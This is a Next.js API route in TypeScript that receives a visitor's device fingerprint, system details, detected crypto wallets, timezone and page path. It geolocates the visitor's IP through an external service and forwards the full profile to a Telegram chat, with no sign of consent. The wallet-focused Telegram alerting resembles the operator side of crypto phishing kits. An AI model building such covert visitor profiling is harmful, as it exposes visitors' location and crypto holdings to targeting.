import { NextResponse } from "next/server";
import { formatVisitorAlert, sendTelegramAlert } from "@/lib/telegram";
import { markVisitorSeen, visitorDeviceKey } from "@/lib/visitorStore";

export const runtime = "nodejs";

type Payload = {
  deviceFingerprint?: string;
  system?: string;
  wallets?: string[];
  timezone?: string;
  path?: string;
};

function normalizeIp(raw: string): string {
  let ip = raw.trim();
  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
  return ip;
}

function clientIp(request: Request): string {
  const xf = request.headers.get("x-forwarded-for");
  if (xf) {
    const first = xf.split(",")[0]?.trim();
    if (first) return normalizeIp(first);
  }
  const real = request.headers.get("x-real-ip")?.trim();
  if (real) return normalizeIp(real);
  const cf = request.headers.get("cf-connecting-ip")?.trim();
  if (cf) return normalizeIp(cf);
  const netlify = request.headers.get("x-nf-client-connection-ip")?.trim();
  if (netlify) return normalizeIp(netlify);
  return "unknown";
}

function isPrivateIp(ip: string): boolean {
  if (!ip || ip === "unknown") return true;
  if (ip === "127.0.0.1" || ip === "::1" || ip === "localhost") return true;
  if (ip.startsWith("192.168.") || ip.startsWith("10.")) return true;
  if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true;
  return false;
}

async function lookupLocation(ip: string): Promise<string> {
  if (isPrivateIp(ip)) return "Local development";

  try {
    const res = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city`,
      { signal: AbortSignal.timeout(4000) },
    );
    if (!res.ok) return "Unknown";
    const data = (await res.json()) as {
      status?: string;
      country?: string;
      regionName?: string;
      city?: string;
    };
    if (data.status !== "success") return "Unknown";
    return [data.city, data.regionName, data.country].filter(Boolean).join(", ") || "Unknown";
  } catch {
    return "Unknown";
  }
}

export async function POST(request: Request) {
  let body: Payload;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const fingerprintRaw = (body.deviceFingerprint ?? "").trim().slice(0, 800);
  if (fingerprintRaw.length < 8) {
    return NextResponse.json({ ok: false }, { status: 422 });
  }

  const deviceKey = visitorDeviceKey(fingerprintRaw);
  const ip = clientIp(request);
  // Include local/private IPs too — critical for same-PC local testing (127.0.0.1)
  const ipKey = ip !== "unknown" ? ip : null;

  const result = await markVisitorSeen(deviceKey, ipKey);
  const visitorType = result.returning ? "Returning user" : "New user";

  const system = (body.system ?? "Unknown").trim().slice(0, 160);
  const timezone = (body.timezone ?? "Unknown").trim().slice(0, 80);
  const pagePath = (body.path ?? "/").trim().slice(0, 200);
  const wallets = Array.isArray(body.wallets)
    ? body.wallets.map((w) => String(w).trim().slice(0, 40)).filter(Boolean).slice(0, 20)
    : [];

  const location = await lookupLocation(ip);
  const walletsLabel = wallets.length > 0 ? wallets.join(", ") : "None detected";

  console.log("[visit]", {
    visitorType,
    deviceKey: deviceKey.slice(0, 8),
    knownDevice: result.knownDevice,
    knownIp: result.knownIp,
    ip,
    location,
    system,
    wallets: walletsLabel,
    timezone,
    pagePath,
  });

  await sendTelegramAlert(
    formatVisitorAlert({
      visitorType,
      location,
      ip,
      system,
      wallets: walletsLabel,
      timezone,
      path: pagePath,
    }),
  );

  return NextResponse.json({ ok: true, visitorType });
}
